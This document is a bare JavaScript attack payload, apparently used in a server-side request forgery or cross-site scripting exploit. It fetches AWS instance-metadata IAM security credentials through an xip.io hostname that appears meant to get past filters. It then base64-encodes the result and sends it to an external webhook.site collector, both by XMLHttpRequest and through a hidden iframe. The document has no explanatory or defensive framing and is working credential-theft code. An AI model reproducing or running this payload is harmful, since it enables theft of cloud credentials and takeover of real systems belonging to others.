function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    var oReqx = new XMLHttpRequest();
    oReqx.open("GET", "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+b64);
    oReqx.send();
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+b64;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "https://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/ami-07cae14b3eea4cd53"); 
oReq.send();
